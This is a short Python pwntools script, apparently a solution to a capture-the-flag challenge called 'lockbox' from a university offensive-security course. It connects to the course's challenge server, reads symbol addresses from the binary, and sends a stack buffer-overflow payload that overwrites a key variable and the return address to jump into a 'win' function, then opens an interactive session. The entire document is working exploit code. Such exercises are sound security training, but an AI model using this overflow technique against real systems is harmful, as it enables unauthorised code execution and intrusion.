from pwn import *

context.binary = './lockbox'
context.log_level = 'error'

e = ELF('./lockbox')
conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1282)

conn.recvuntil(': ')
conn.sendline(b'<NET ID>')

conn.recvuntil("?\n")

key_addr = e.symbols.get('key')
win_addr = e.symbols.get('win')

if not key_addr or not win_addr:
    conn.close()
    exit("Required symbols not found.")

adjusted_win_addr = win_addr + 5

buffer_size = 0x10
key_value = 0xbeeff0cacc1a
padding = 0x28

payload = b'A' * buffer_size
payload += p64(key_addr)
payload += p64(key_value)
payload += b'B' * padding
payload += p64(adjusted_win_addr)

if len(payload) != buffer_size + 8 + 8 + padding + 8:
    conn.close()
    exit("Payload length mismatch.")

conn.sendline(payload)
conn.interactive()
